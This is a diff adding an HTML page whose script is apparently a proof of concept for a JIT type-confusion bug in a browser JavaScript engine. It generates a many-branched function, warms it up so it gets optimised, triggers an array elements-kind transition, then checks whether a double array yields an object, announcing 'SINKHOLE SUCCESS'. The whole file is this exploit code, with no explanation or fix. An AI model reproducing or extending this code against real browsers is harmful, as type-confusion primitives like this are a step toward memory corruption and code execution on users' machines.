@@ -1,0 +1,47 @@
+<!DOCTYPE html><html><body><script>
+let dummy = { a: 1 };
+let stable = [dummy, 2.2, 3.3];
+
+function create_and_warmup() {
+  let lines = [];
+  lines.push("function trigger(x, arr, obj) {");
+  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+  lines.push(`
+    arr[0] = obj;
+    let res = null;
+    while ((res = arr[1]) !== null) {
+      break;
+    }
+    return res;
+  `);
+  lines.push("}");
+  lines.push("return trigger;");
+  let fn = new Function(lines.join("\n"))();
+  
+  // Transition a few times first to establish transition source
+  for (let i = 0; i < 10; i++) {
+    let a = [1.1, 2.2, 3.3];
+    fn(1000, a, dummy);
+  }
+  
+  // Warmup invocation count
+  for (let i = 0; i < 20000; i++) {
+    fn(i, stable, dummy);
+  }
+  return fn;
+}
+
+async function main() {
+  let fn = create_and_warmup();
+  await new Promise(r => setTimeout(r, 500));
+  console.log("WARMUP_FINISHED");
+  
+  let victim = [1.1, 2.2, 3.3];
+  let res = fn(1000, victim, dummy);
+  console.log("TEST RESULT: type=" + (typeof res) + " val=" + res);
+  if (typeof res === "object") {
+    console.log("🔥🔥🔥 SINKHOLE SUCCESS! Object:", res, "🔥🔥🔥");
+  }
+}
+main();
+</script></body></html>
